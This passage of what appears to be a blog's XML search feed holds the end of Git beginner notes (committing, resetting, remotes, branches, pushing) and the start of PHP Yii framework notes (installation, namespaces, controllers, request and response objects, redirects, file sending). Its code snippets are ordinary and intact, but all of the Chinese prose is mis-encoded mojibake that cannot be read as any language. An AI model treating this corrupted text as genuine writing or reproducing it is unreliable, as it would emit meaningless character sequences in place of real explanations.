è¿™å°æœºå™¨ä¸Šæ‰€æœ‰çš„Gitä»“åº“éƒ½ä¼šä½¿ç”¨è¿™ä¸ªé…ç½®ï¼Œ</p><h2 id="åˆ›å»ºç‰ˆæœ¬åº“"><a href="#åˆ›å»ºç‰ˆæœ¬åº“" class="headerlink" title="åˆ›å»ºç‰ˆæœ¬åº“"></a>åˆ›å»ºç‰ˆæœ¬åº“</h2><p>åœ¨git-bashé‡Œé¢è¿›å…¥åˆ°æ”¾ä½ é¡¹ç›®çš„æ–‡ä»¶å¤¹ç›´æ¥ä¸€æ¡<code>git init</code>å‘½ä»¤å³å¯<br>è¿™é‡Œä¼šäº§ç”Ÿä¸€ä¸ª<code>.git</code>çš„éšè—æ–‡ä»¶ï¼Œè¿™é‡Œæƒ³èµ·äº†CTFé‡Œé¢å¯èƒ½å‡ºç°çš„<code>.git</code>æºç æ³„éœ²çš„é¢˜ç›®ï¼Œæ³¨æ„ä¸€ä¸‹</p><p>æŠŠæ–‡ä»¶å­˜å‚¨åœ¨ç‰ˆæœ¬åº“<br>ä¸¤ä¸ªæ­¥éª¤<br>ç¬¬ä¸€æ­¥ï¼Œä½¿ç”¨å‘½ä»¤<code>git add &lt;file&gt;</code>ï¼Œæ³¨æ„ï¼Œå¯åå¤å¤šæ¬¡ä½¿ç”¨ï¼Œæ·»åŠ å¤šä¸ªæ–‡ä»¶ï¼›</p><p>ç¬¬äºŒæ­¥ï¼Œä½¿ç”¨å‘½ä»¤<code>git commit</code>ï¼Œå®Œæˆã€‚<br>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add file1.txt</span><br><span class="line">$ git add file2.txt file3.txt</span><br><span class="line">$ git commit -m <span class="string">"add 3 files."</span></span><br></pre></td></tr></table></figure><p>æäº¤åˆ°ç‰ˆæœ¬åº“åï¼Œ<br>æˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤å»æŸ¥çœ‹çŠ¶æ€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰å¦å¤–ä¸€æ¡å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff + å…·ä½“è¢«ä¿®æ”¹çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>å¯ä»¥æŸ¥çœ‹ä¿®æ”¹å†…å®¹<br><code>git log</code>å‘½ä»¤æŸ¥çœ‹å½“å‰ç‰ˆæœ¬åº“çš„çŠ¶æ€<br>å¦‚æœå«Œè¾“å‡ºä¿¡æ¯å¤ªå¤šï¼Œçœ‹å¾—çœ¼èŠ±ç¼­ä¹±çš„ï¼Œå¯ä»¥è¯•è¯•åŠ ä¸Š<code>--pretty=oneline</code> è¿™æ ·ä»–å°±ä¼šè¾“å‡ºå„æ¬¡ä¿®æ”¹çš„<code>commit idï¼ˆç‰ˆæœ¬å·ï¼‰</code></p><p>Gitè¿˜æä¾›äº†ä¸€ä¸ªå‘½ä»¤<code>git reflog</code>ç”¨æ¥è®°å½•ä½ çš„æ¯ä¸€æ¬¡å‘½ä»¤,æˆ‘ä»¬ä¸€èˆ¬ç”¨è¿™ä¸ªå»æ‰¾å›è¯¯åˆ çš„æ­¥éª¤</p><h2 id="ç‰ˆæœ¬å›é€€"><a href="#ç‰ˆæœ¬å›é€€" class="headerlink" title="ç‰ˆæœ¬å›é€€"></a>ç‰ˆæœ¬å›é€€</h2><p>åœ¨Gitä¸­ï¼Œç”¨HEADè¡¨ç¤ºå½“å‰ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯æœ€æ–°çš„æäº¤commit idï¼Œä¸Šä¸€ä¸ªç‰ˆæœ¬å°±æ˜¯<code>HEAD^</code>ï¼Œä¸Šä¸Šä¸€ä¸ªç‰ˆæœ¬å°±æ˜¯<code>HEAD^^</code>ï¼Œå½“ç„¶å¾€ä¸Š100ä¸ªç‰ˆæœ¬å†™100ä¸ª^æ¯”è¾ƒå®¹æ˜“æ•°ä¸è¿‡æ¥ï¼Œæ‰€ä»¥å†™æˆ<code>HEAD~100</code><br>å›é€€çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è¿™æ ·å»åš<br><code>git reset --hard commit_id</code> è¿™é‡Œçš„commit_idå¯ä»¥ä¸å†™å®Œ</p><h2 id="åˆ é™¤ä¸æ¢å¤æ–‡ä»¶"><a href="#åˆ é™¤ä¸æ¢å¤æ–‡ä»¶" class="headerlink" title="åˆ é™¤ä¸æ¢å¤æ–‡ä»¶"></a>åˆ é™¤ä¸æ¢å¤æ–‡ä»¶</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm + æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>ç”¨äºåˆ é™¤ä¸€ä¸ªæ–‡ä»¶ã€‚å¦‚æœä¸€ä¸ªæ–‡ä»¶å·²ç»è¢«æäº¤åˆ°ç‰ˆæœ¬åº“ï¼Œé‚£ä¹ˆä½ æ°¸è¿œä¸ç”¨æ‹…å¿ƒè¯¯åˆ ï¼Œä½†æ˜¯è¦å°å¿ƒï¼Œä½ åªèƒ½æ¢å¤æ–‡ä»¶åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œä½ ä¼šä¸¢å¤±æœ€è¿‘ä¸€æ¬¡æäº¤åä½ ä¿®æ”¹çš„å†…å®¹ã€‚<br><code>git checkout -- file</code>å¯ä»¥ä¸¢å¼ƒå·¥ä½œåŒºçš„ä¿®æ”¹ï¼Œå°±æ˜¯è®©è¿™ä¸ªæ–‡ä»¶å›åˆ°æœ€è¿‘ä¸€æ¬¡git commitæˆ–git addæ—¶çš„çŠ¶æ€ã€‚</p><hr><p>ä¸‹é¢çš„æ­¥éª¤æœ‰ç‚¹ä½“ç°åˆ†å¸ƒå¼ç‰¹ç‚¹äº†</p><h2 id="æ·»åŠ è¿œç¨‹åº“"><a href="#æ·»åŠ è¿œç¨‹åº“" class="headerlink" title="æ·»åŠ è¿œç¨‹åº“"></a>æ·»åŠ è¿œç¨‹åº“</h2><p>ç‚¹å‡»Create a new repositoryè¿›å…¥é¡µé¢<br>è‡ªå·±æ–°å»ºä¸ªé¡¹ç›®å°±å¥½äº†<br><a href="https://imgchr.com/i/CgB48H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgB48H.md.png" alt="CgB48H.md.png"></a></p><p>è¦å…³è”ä¸€ä¸ªè¿œç¨‹åº“ï¼Œä½¿ç”¨å‘½ä»¤<code>git remote add origin git@server-name:path/repo-name.git</code><br>è¿™éƒ¨åˆ†åé¢çš„ä¸œè¥¿å¯ä»¥åœ¨ä½ çš„é¡¹ç›®ä¸­å¯»æ‰¾,<br>è¿™é‡Œè¿˜å…³ç³»åˆ°httpsè¿˜æœ‰sslï¼Œä½¿ç”¨httpsé™¤äº†é€Ÿåº¦æ…¢ä»¥å¤–ï¼Œè¿˜æœ‰ä¸ªæœ€å¤§çš„éº»çƒ¦æ˜¯æ¯æ¬¡æ¨é€éƒ½å¿…é¡»è¾“å…¥å£ä»¤ï¼Œä½†æ˜¯åœ¨æŸäº›åªå¼€æ”¾<br>httpç«¯å£çš„å…¬å¸å†…éƒ¨å°±æ— æ³•ä½¿ç”¨sshåè®®è€Œåªèƒ½ç”¨httpsã€‚<br>å…³è”åï¼Œä½¿ç”¨å‘½ä»¤<code>git push -u origin master</code><strong>ç¬¬ä¸€æ¬¡</strong>æ¨é€masteråˆ†æ”¯çš„æ‰€æœ‰å†…å®¹ï¼›</p><p>æ­¤åï¼Œæ¯æ¬¡æœ¬åœ°æäº¤åï¼Œåªè¦æœ‰å¿…è¦ï¼Œå°±å¯ä»¥ä½¿ç”¨å‘½ä»¤<code>git push origin master</code>æ¨é€æœ€æ–°ä¿®æ”¹</p><h2 id="ä»è¿œç¨‹åº“å…‹éš†"><a href="#ä»è¿œç¨‹åº“å…‹éš†" class="headerlink" title="ä»è¿œç¨‹åº“å…‹éš†"></a>ä»è¿œç¨‹åº“å…‹éš†</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@server-name:path/repo-name.git</span><br></pre></td></tr></table></figure><p>åé¢çš„å†…å®¹è·Ÿå…³è”å¾ˆç›¸ä¼¼</p><h2 id="åˆ†æ”¯ç®¡ç†"><a href="#åˆ†æ”¯ç®¡ç†" class="headerlink" title="åˆ†æ”¯ç®¡ç†"></a>åˆ†æ”¯ç®¡ç†</h2><p>åˆ†æ”¯çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹åˆ†æ”¯ï¼šgit branch</span><br><span class="line"></span><br><span class="line">åˆ›å»ºåˆ†æ”¯ï¼šgit branch &lt;name&gt;</span><br><span class="line"></span><br><span class="line">åˆ‡æ¢åˆ†æ”¯ï¼šgit checkout &lt;name&gt;</span><br><span class="line"></span><br><span class="line">åˆ›å»º+åˆ‡æ¢åˆ†æ”¯ï¼šgit checkout -b &lt;name&gt;</span><br><span class="line"></span><br><span class="line">åˆå¹¶æŸåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯ï¼šgit merge &lt;name&gt;</span><br><span class="line"></span><br><span class="line">åˆ é™¤åˆ†æ”¯ï¼šgit branch -d &lt;name&gt;</span><br></pre></td></tr></table></figure><h2 id="æ¨é€åˆ†æ”¯"><a href="#æ¨é€åˆ†æ”¯" class="headerlink" title="æ¨é€åˆ†æ”¯"></a>æ¨é€åˆ†æ”¯</h2><p>æ¨é€åˆ†æ”¯ï¼Œå°±æ˜¯æŠŠè¯¥åˆ†æ”¯ä¸Šçš„æ‰€æœ‰æœ¬åœ°æäº¤æ¨é€åˆ°è¿œç¨‹åº“ã€‚æ¨é€æ—¶ï¼Œè¦æŒ‡å®šæœ¬åœ°åˆ†æ”¯ï¼Œè¿™æ ·ï¼ŒGitå°±ä¼šæŠŠè¯¥åˆ†æ”¯æ¨é€åˆ°è¿œç¨‹åº“å¯¹åº”çš„è¿œç¨‹åˆ†æ”¯<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure></p><p>æ¨é€å…¶ä»–åˆ†æ”¯ï¼Œæ¯”å¦‚devï¼Œå°±æ”¹æˆï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin dev</span><br></pre></td></tr></table></figure><p>è‡ªæˆ‘æ„Ÿè§‰ç°åœ¨å°±è¿™å‡ éƒ¨åˆ†å¯¹æˆ‘çš„é¡¹ç›®æœ‰å¸®åŠ©ï¼Œå…ˆè®°ä¸‹æ¥ï¼Œè¿˜æœ‰äº›å†…å®¹ç­‰ä»¥åå­¦ä¹ å§ </p><p>å‚è€ƒç½‘ç«™<br><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000</a><br><a href="https://www.cnblogs.com/schaepher/p/4933873.html" target="_blank" rel="noopener">https://www.cnblogs.com/schaepher/p/4933873.html</a></p>]]></content>
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP_Yiiæ¡†æ¶å­¦ä¹ ç¬”è®°</title>
      <link href="/PHP-Yii.html"/>
      <url>/PHP-Yii.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>  æœ€è¿‘å‡†å¤‡è¦åŸºäºYiiæ¡†æ¶å†™ä¸€ä¸ªé¡¹ç›®ï¼Œäºæ˜¯å‡†å¤‡è‡ªå­¦ä¸€æ³¢ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹è‡ªå·±çš„ç¬”è®°</p><a id="more"></a><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="Yiiæ¡†æ¶çš„æ­å»º"><a href="#Yiiæ¡†æ¶çš„æ­å»º" class="headerlink" title="Yiiæ¡†æ¶çš„æ­å»º"></a>Yiiæ¡†æ¶çš„æ­å»º</h3><p>é¦–å…ˆæˆ‘ç”¨çš„æ˜¯phpstudyç¯å¢ƒä¸‹æ­å»ºYiiæ¡†æ¶ï¼Œæ³¨æ„è¿™é‡Œä¸€å®šè¦ç”¨PHP5.4ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Yiiæ¡†æ¶ç›®å½•ä¸‹çš„requirements.phpæŸ¥çœ‹æˆ‘ä»¬è¿˜å·®ä¸€äº›ä»€ä¹ˆæ¡ä»¶ä¹‹ç±»çš„ã€‚<br><a href="https://imgchr.com/i/CgDiZV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgDiZV.md.png" alt="CgDiZV.md.png"></a></p><p>æ­å»ºæ¡†æ¶æˆ‘è¿™é‡Œç”¨äº†ä¸¤ç§æ–¹æ³•å»å®‰è£…</p><p>ç¬¬ä¸€ç§ç›´æ¥å®˜ç½‘ä¸Šä¸‹è½½æºç ï¼Œè§£å‹åæ”¾åˆ°phpstudyçš„ç½‘ç«™æ ¹ç›®å½•ä¸‹é¢ï¼Œä¸è¿‡è¿™ç§åŠæ³•è¦è‡ªå·±æ‰‹åŠ¨è®¾ç½®cookieï¼Œè¿™ä¸ªæ–‡ä»¶åœ¨configç›®å½•ä¸‹çš„web.phpæ–‡ä»¶ï¼Œè¿™é‡Œæœ€å¥½è®¾ç½®åˆ°è‡ªå·±éƒ½ä¸è®¤å¾—æœ€å¥½<br><a href="https://imgchr.com/i/CgDFaT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgDFaT.md.png" alt="CgDFaT.md.png"></a><br>ä¹Ÿå°±æ˜¯ä¸Šå›¾çš„çº¢æ ‡çš„åœ°æ–¹</p><p>ç¬¬äºŒç§å°±æ˜¯é€šè¿‡composerå®‰è£…ï¼Œè¿™ç§æ–¹æ³•å°±ä¸ç”¨è®¾ç½®cookieï¼Œä½†è¿™ä¸ªæ–¹æ³•ä¸‹è½½çš„æœ‰ç‚¹æ…¢ï¼Œè€Œä¸”å®‰è£…è¿‡ç¨‹ä¸­è¿˜ä¼šå‡ºç°ä¸€ç³»åˆ—æ¯›ç—…ã€‚ã€‚ç‰¹åˆ«æ˜¯å…³äºé‚£ä¸ªSSL/TLSçš„è®¾ç½®ï¼Œæœ€åæˆ‘æ˜¯åœ¨php-inié‡Œé¢æŠŠç›¸å…³é…ç½®ç»™å¼„å¥½ï¼Œè€Œä¸”åœ¨phpstudyé‡Œé¢æŠŠphp-opensslæ‰“å¼€æ‰è§£å†³çš„ï¼Œ<br>ä½†æ˜¯æœ€åå‘½ä»¤èˆªè¿˜æ˜¯æœ‰è¿™æ ·çš„ä¸€å¥è¯<br><img src="https://s1.ax1x.com/2018/05/20/CgDkIU.png" alt="CgDkIU.png"><br>ä½†å¥½åƒå¯¹æ•´ä½“æ²¡å•¥å½±å“ã€‚ã€‚ã€‚</p><p>ä¸Šé¢çš„é…ç½®å¼„å¥½ä»¥åå¯ä»¥åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€webç›®å½•ä¸‹çš„index.phpï¼Œå¦‚æœå‡ºç°ä»¥ä¸‹ç•Œé¢è¡¨æ˜å®‰è£…æˆåŠŸã€‚<br><a href="https://imgchr.com/i/CgDus1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgDus1.md.png" alt="CgDus1.md.png"></a></p><h3 id="å‘½åç©ºé—´"><a href="#å‘½åç©ºé—´" class="headerlink" title="å‘½åç©ºé—´"></a>å‘½åç©ºé—´</h3><p>ä¸ºä»€ä¹ˆè¦æå‡ºå‘½åç©ºé—´æ¦‚å¿µï¼Œè¿™æ˜¯å› ä¸ºåœ¨æ–‡ä»¶åŒ…å«çš„æ—¶å€™å¦‚æœä¸¤ä¸ªæ–‡ä»¶æ‹¥æœ‰ç›¸åŒçš„ç±»çš„è¯ï¼Œä¼šå‡ºç°ä¸‹é¢çš„æŠ¥é”™ï¼Œè¿™æ—¶å€™å‘½åç©ºé—´å°±ä¼šèµ·åˆ°è‡³å…³é‡è¦çš„ä½œç”¨äº†<br><a href="https://imgchr.com/i/CgDldK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgDldK.md.png" alt="CgDldK.md.png"></a></p><p>è§£å†³åŠæ³•å°±æ˜¯åœ¨ä»»æ„åŒ…å«çš„ä¸€ä¸ªæ–‡ä»¶é‡Œé¢æ”¹å˜å‘½åç©ºé—´ï¼Œç”¨<code>using</code>è¯­å¥ï¼Œå°±åƒä¸‹å›¾<br><img src="https://s1.ax1x.com/2018/05/20/CgDRLq.png" alt="CgDRLq.png"><br>æˆ‘ä»¬åœ¨indexé¡µé¢å¯ä»¥è¿™æ ·å»åˆ›å»ºä¸€ä¸ªç±»ï¼Œç»“æœå¦‚ä¸‹ </p><p><img src="https://s1.ax1x.com/2018/05/20/CgD4oT.png" alt="CgD4oT.png"></p><p>ä½†æ˜¯å‡ºç°å¤šä¸ªä¸€æ ·çš„ç±»ï¼Œæœºä¼šæ˜¾å¾—å†—ä½™<br>äºæ˜¯æˆ‘ä»¬å¯ä»¥è¿™æ ·åšï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨<code>as</code>å»é‡å‘½åç±»ï¼Œè¿™ç¬¦åˆå¤šä¸ªç›¸åŒçš„ç±»çš„æ–‡ä»¶åŒ…å«çš„æƒ…å†µ</p><p><img src="https://s1.ax1x.com/2018/05/20/CgDoYF.png" alt="CgDoYF.png"></p><p>åœ¨å‘½åç©ºé—´é‡Œé¢æˆ‘ä»¬è¦æ³¨æ„çš„æ˜¯å¦‚æœä¸åŠ usingè¯­å¥çš„è¯ï¼Œé»˜è®¤æ˜¯åœ¨ä¸€ä¸ªå…¨å±€å‘½åç©ºé—´é‡Œé¢ï¼Œæˆ‘ä»¬åœ¨ç”¨useè¯­å¥æ˜¯åº”è¯¥æ˜¯è¿™æ ·çš„ï¼Œåƒä¸‡è¦æ³¨æ„<code>\</code><br><img src="https://s1.ax1x.com/2018/05/20/CgDTW4.png" alt="CgDTW4.png"></p><h3 id="æ§åˆ¶å™¨"><a href="#æ§åˆ¶å™¨" class="headerlink" title="æ§åˆ¶å™¨"></a>æ§åˆ¶å™¨</h3><p>ä¸€èˆ¬æ§åˆ¶å™¨çš„æ–‡ä»¶æ˜¯æ”¾åœ¨<code>controllers</code>ç›®å½•ä¸‹é¢çš„<br>ä¸€èˆ¬å‘½åçš„æ ¼å¼ä¸º<code>name+Controller</code>ï¼Œä»¥<code>Controller</code>è¿™ä¸ªå•è¯ç»“æŸ<br>è€Œåœ¨å¯¹åº”çš„æ–‡ä»¶é‡Œé¢çš„ç±»æˆ‘ä»¬ä¹Ÿåº”è¯¥åŒå(å› ä¸ºæˆ‘ä»¬æ‰€è¯´çš„æ§åˆ¶å™¨å¤§éƒ¨åˆ†éƒ½æ˜¯ä¸€ä¸ªç±»ï¼Œè€Œä¸”è§„å®šå¾—æ”¾åœ¨ä¸€ä¸ªå‘½åç©ºé—´é‡Œé¢)<br>è€Œä¸”å®šä¹‰çš„ç±»å¿…é¡»çš„å†ç»§æ‰¿æ§åˆ¶å™¨è¿™ä¸€ä¸ªç±»ï¼Œæ‰€ä»¥<code>extends</code>åé¢çš„ä¸œè¥¿ä¸èƒ½å°‘</p><p>ä½†æ˜¯<code>extends</code>åé¢çš„<code>Controller</code>ä¹Ÿæ˜¯ä¸€ä¸ªç±»ï¼Œä¹Ÿæœ‰è‡ªå·±çš„å‘½åç©ºé—´ï¼Œäºæ˜¯æˆ‘ä»¬è¿˜å¾—åŠ ä¸Š<code>use yii\web\Controller</code>;<br>é‡Œé¢çš„æ“ä½œå¿…é¡»ä»¥<code>action</code>å¼€å¤´åŠ ä¸Šåå­—</p><p><img src="https://s1.ax1x.com/2018/05/20/CgDHSJ.png" alt="CgDHSJ.png"></p><p>æˆ‘ä»¬å¦‚ä½•æ¥å¼•ç”¨è¿™ä¸ªæ“ä½œï¼Œæˆ‘ä»¬å°±è¦åœ¨å…¥å£è„šæœ¬é‡Œé¢åŠ ä¸Š<code>r=hello/index</code>,å…¶ä¸­helloæ˜¯æŒ‡helloæ§åˆ¶å™¨ï¼Œindexæ˜¯æŒ‡helloæ§åˆ¶å™¨ä¸‹çš„indexçš„æ“ä½œ<br><img src="https://s1.ax1x.com/2018/05/20/CgDXex.png" alt="CgDXex.png"></p><h3 id="æ§åˆ¶å™¨è¯·æ±‚å¤„ç†"><a href="#æ§åˆ¶å™¨è¯·æ±‚å¤„ç†" class="headerlink" title="æ§åˆ¶å™¨è¯·æ±‚å¤„ç†"></a>æ§åˆ¶å™¨è¯·æ±‚å¤„ç†</h3><p>æ§åˆ¶å™¨ä¸‹ä¼ å‚çš„è¯ä¸€èˆ¬æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä¸€ä¸ªå…¨å±€çš„ç±»YIIï¼Œä»¥è¿™æ ·çš„urlä¸ºä¾‹å­è¯´æ˜åœ¨ä»£ç é‡Œé¢æ˜¯å¦‚ä½•æ‰§è¡Œçš„ï¼Œè¿™ä¸ªurlè¡¨æ˜äº†ç°åœ¨çš„æ“ä½œæ˜¯helloæ§åˆ¶å™¨ä¸‹çš„indexæ“ä½œçš„ä¼ å‚æ“ä½œ<br><img src="https://s1.ax1x.com/2018/05/20/CgDvTK.png" alt="CgDvTK.png"></p><p>æˆ‘ä»¬é¦–å…ˆè¦è°ƒç”¨å…¨å±€ç±»Yiiä¸‹çš„é™æ€å˜é‡$appï¼Œä¹Ÿå°±æ˜¯åº”ç”¨ä¸»ä½“é‡Œé¢çš„requestæ–¹æ³•<br>è®°å¾—ä¸è¦å¿˜è®°<code>$request = \Yii::$app-&gt;request</code>ä¸­çš„\ç¼ºäº†å°±å¯èƒ½æŠ¥é”™ï¼Œè™½ç„¶å®˜æ–¹æ–‡æ¡£æ²¡åŠ ï¼Œä½†æ˜¯å°è¯•è¿‡åå‘ç°è¿˜æ˜¯è¦åŠ ä¸Šçš„ï¼Œæ‰€ä»¥è¯´å‰é¢ä¸ºä»€ä¹ˆåœ¨å‘½åç©ºé—´é‡Œé¢æåŠè¦å…¨å±€ç±»å‰é¢åŠ ä¸Š<code>\</code></p><p>å¯¹äºgetä¼ å‚æˆ‘ä»¬å¯ä»¥è¿™æ ·å»åˆ©ç”¨<br><code>$request-&gt;get(&#39;id&#39;,20)</code>ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯getæ–¹å¼è¯·æ±‚çš„åå­—ï¼Œç¬¬äºŒä¸ªæ˜¯ä¼ å‚è¿”å›çš„é»˜è®¤å€¼ï¼Œè¿˜æœ‰postä¼ å‚ä¹Ÿæ˜¯è¿™æ ·çš„æ“ä½œ</p><p>è¿˜æœ‰ä¸€ä¸ªå¸¸ç”¨çš„æ–¹æ³•å°±æ˜¯åˆ¤æ–­ä»–æ˜¯postæ–¹æ³•è¿˜æ˜¯getæ–¹æ³•<br><code>$request-&gt;isGet</code>,å¦‚ä¸‹å›¾<br><img src="https://s1.ax1x.com/2018/05/20/CgrCSH.png" alt="CgrCSH.png"></p><p><img src="https://s1.ax1x.com/2018/05/20/Cgri6A.png" alt="Cgri6A.png"><br>åŒæ ·çš„Postä¹Ÿä¸€æ ·ï¼Œä¸¾ä¸€åä¸‰è€Œå·²<br>æˆ‘ä»¬è¿˜èƒ½è·å–ipåœ°å€ä¾‹å¦‚<code>$request-&gt;userIp</code></p><p>æ›´å¤šçš„æ–¹æ³•è¿˜å¯ä»¥å»æŸ¥å®˜æ–¹æ‰‹å†Œ</p><h3 id="æ§åˆ¶å™¨å“åº”"><a href="#æ§åˆ¶å™¨å“åº”" class="headerlink" title="æ§åˆ¶å™¨å“åº”"></a>æ§åˆ¶å™¨å“åº”</h3><p>å…³äºæ§åˆ¶å™¨çš„å“åº”ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªä¸œè¥¿å»è¿›è¡Œå¤šä¸ªæ“ä½œ<br>é¦–å…ˆè¿™ä¸€ä¸ªä¸œè¥¿ä¹Ÿéœ€è¦è°ƒç”¨å…¨å±€ç±»Yiiä¸‹çš„é™æ€å˜é‡$appï¼Œä¹Ÿå°±æ˜¯åº”ç”¨ä¸»ä½“é‡Œé¢çš„<code>response</code>æ–¹æ³•</p><p>å‡å®šå‰ææ¡ä»¶æ˜¯<code>$res=\YII::$app-&gt;response</code><br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»–æ¥æ”¹å˜è¿”å›çš„çŠ¶æ€ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res-&gt;statusCode = &apos;404&apos;;  //é»˜è®¤æ˜¯200</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥ç”¨æ¥æ”¹å˜headerçš„ä¸€äº›å±æ€§<br><code>$res-&gt;headers-&gt;add(&#39;pogram&#39;,&#39;1234556&#39;);</code>ç»™å¤´éƒ¨å¢åŠ å±æ€§</p><p>è¿˜èƒ½è®¾ç½®è·Ÿåˆ é™¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$res-&gt;headers-&gt;set(&apos;pogram&apos;,&apos;123456&apos;);</span><br><span class="line">$res-&gt;headers-&gt;remove(&apos;program&apos;);</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰è·³è½¬åŠŸèƒ½<br><code>$res-&gt;headers-&gt;add(&#39;location&#39;,&#39;http://www.baidu.com&#39;);</code>  ä½†æ˜¯è¿™ä¸€å¥è¯å¥½åƒæ²¡ä»€ä¹ˆååº”ã€‚ã€‚å®˜æ–¹æ‰‹å†Œæˆ‘ä¹Ÿæ²¡æ‰¾åˆ°ã€‚ã€‚è«éè¢«æŠ›å¼ƒäº†ï¼Ÿ</p><p>ä½†æ˜¯ç”±äºè¿™ä¸ªåŠŸèƒ½æ¯”è¾ƒå¸¸ç”¨ï¼Œæ‰€ä»¥ç›´æ¥å°è£…åœ¨Controlleré‡Œé¢ï¼Œè¿™å°±æœ‰äº†ç¬¬äºŒç§å†™æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;redirect(&apos;http://www.baidu.com&apos;,302); //è¿™é‡Œçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯çŠ¶æ€ç </span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸‹è½½åŠŸèƒ½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res-&gt;headers-&gt;add(&apos;content-disposition&apos;,&apos;attachment;filename=&quot;a.jpg&quot;&apos;);  è¿™é‡Œçš„æ–‡ä»¶åè‡ªå®šä¹‰ï¼Œä½†æ€»è§‰å¾—è®°ç€é‡Œé¢çš„å‚æ•°æœ‰ç‚¹å›°éš¾</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„å› ä¸ºå¸¸ç”¨è€Œæœ‰ä¸€ä¸ªæ›´ç›´æ¥çš„<code>send</code>æ–¹æ³•<br><code>$res-&gt;sendFile(&quot;./robots.txt&quot;);</code>æ³¨æ„è¿™é‡Œçš„æ–‡ä»¶æ˜¯å­˜åœ¨äºwebç›®å½•ä¸‹ä¹Ÿå°±æ˜¯å½“å‰ç›®å½•ä¸‹çš„çš„æ–‡ä»¶</p><p>è¿™ä¸€éƒ¨åˆ†å‚è€ƒæ–‡æ¡£ä¹Ÿå¾ˆè¯¦ç»†ï¼Œæˆ‘å°±é€‰å‡ ä¸ªé‡è¦çš„æ¥å­¦ä¹ ä¸€ä¸‹ã€‚ã€‚ã€‚</p><h3 id="Sessionå¤„ç†"><a href="#Sessionå¤„ç†" class="headerlink" title="Sessionå¤„ç†"></a>Sessionå¤„ç†</h3><p>åŒæ ·çš„è¿™ä¹Ÿæ˜¯åœ¨å…¨å±€ç±»Yiiä¸‹çš„åº”ç”¨ä¸»ä½“appä¸‹çš„sessionæ–¹æ³•<br>ä»¥<code>$session = \YII::$app-&gt;session;</code>ä¸ºä¾‹<br>åˆ¤æ–­æ˜¯å¦è®¾ç½®äº†sessionç”¨ä¸€ä¸ªæ–¹æ³•isActiveæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 